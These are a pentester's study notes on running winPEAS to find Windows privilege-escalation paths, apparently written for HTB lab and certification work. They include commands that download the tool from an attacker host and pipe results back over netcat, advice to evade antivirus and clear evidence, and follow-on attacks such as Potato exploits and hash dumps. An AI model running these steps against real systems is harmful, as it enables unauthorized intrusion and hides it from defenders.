# winPEAS

**Tags:** `#winpeas` `#privesc` `#windows` `#enumeration` `#postexploit`

Windows Privilege Escalation Awesome Script. Automated enumeration of privesc vectors on Windows — checks service misconfigs, unquoted paths, AlwaysInstallElevated, weak permissions, token privileges, credential files, registry autoruns, and more. Color-coded: red/yellow = high priority.

**Source:** https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
**Install:** Download `.exe` or `.bat` from releases. Serve from Kali.

```cmd
winPEASx64.exe
```

> [!note]
> Red = high-probability privesc vector. Yellow = interesting. Run `winPEASx64.exe` on 64-bit systems, `winPEASx86.exe` on 32-bit. The `.bat` version works without .NET but has less coverage. AV will likely flag the binary — obfuscate or use in-memory execution.

---

## Delivery & Execution

```powershell
# Serve from Kali
python3 -m http.server 8000

# Download to target
certutil -urlcache -split -f http://10.10.14.5:8000/winPEASx64.exe C:\Temp\wp.exe
(New-Object Net.WebClient).DownloadFile('http://10.10.14.5:8000/winPEASx64.exe','C:\Temp\wp.exe')

# Execute
C:\Temp\wp.exe

# Output to file — use `notcolor` so ANSI codes don't garble the file
# (there is no -ansi flag; piping raw output embeds escape codes)
C:\Temp\wp.exe notcolor > C:\Temp\winpeas_out.txt

# Pipe back to Kali via nc
C:\Temp\wp.exe | nc.exe 10.10.14.5 9001
```

---

## Execution Options

```cmd
# Full run (all checks)
winPEASx64.exe

# Specific category only (space-separate several)
winPEASx64.exe systeminfo
winPEASx64.exe userinfo processinfo
winPEASx64.exe servicesinfo
winPEASx64.exe applicationsinfo
winPEASx64.exe networkinfo
winPEASx64.exe filesinfo

# Real modifiers (there is NO `quiet` or `fast` option — the default already
# skips the slower checks):
winPEASx64.exe notcolor           # strip ANSI colour (for redirecting to a file)
winPEASx64.exe log                # also write results to out.txt
winPEASx64.exe -lolbas            # add a LOLBAS search
winPEASx64.exe -vulnpackages      # check installed software vs online vuln DB (slow, noisy)
```

---

## What It Checks

| Category | Examples |
|----------|---------|
| System info | OS version, patches, env vars, WSL |
| Users | Local users, groups, logon sessions |
| Processes | Running as SYSTEM, interesting daemons |
| Services | Unquoted paths, weak permissions, modifiable binaries |
| Applications | Installed software versions |
| Scheduled tasks | Tasks with writable script paths |
| Registry | AlwaysInstallElevated, autorun keys, stored creds |
| Files | Credential files, SSH keys, .kdbx, SAM backups |
| Network | Open ports, firewall rules, shares |
| Token privileges | SeImpersonatePrivilege, SeDebugPrivilege |
| AV / EDR | Installed security products |

---

## High-Value Findings to Act On

```
# SeImpersonatePrivilege → Potato attacks (GodPotato, PrintSpoofer)
# AlwaysInstallElevated → Install MSI as SYSTEM
# Unquoted service path + writable dir → drop malicious binary
# Modifiable service binary → replace binary
# Stored credentials → registry, credential manager, config files
# SAM/SYSTEM backup → offline hash dump
```

---

## .bat Version (No .NET Required)

```cmd
# When .exe is blocked or .NET unavailable
winPEAS.bat

# Less comprehensive — no color, fewer checks
# Good fallback when binary AV detection is an issue
```

---

## OPSEC

- Well-known AV/EDR signature — rename binary before transfer
- Prefer in-memory execution via `execute-assembly` or PowerShell reflection
- Run targeted checks (Seatbelt, PowerUp) instead of full winPEAS on monitored hosts
- Clear evidence: delete binary and temp files after review


> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/Windows Priv Esc|Windows Priv Esc]] (CPTS v2) — automated privesc enumeration on Windows hosts. Quieter/targeted alternatives: [[Tools/Scanning/PowerUp|PowerUp]] (PowerShell, service/registry), [[Tools/Scanning/Seatbelt|Seatbelt]] (C# host survey). Act on a `SeImpersonate` finding with [[Tools/Lateral Movement/Potato|Potato]]; Linux counterpart is linPEAS.
---

*Created: 2026-03-13*
*Updated: 2026-08-31*
*Model: claude-opus-5*
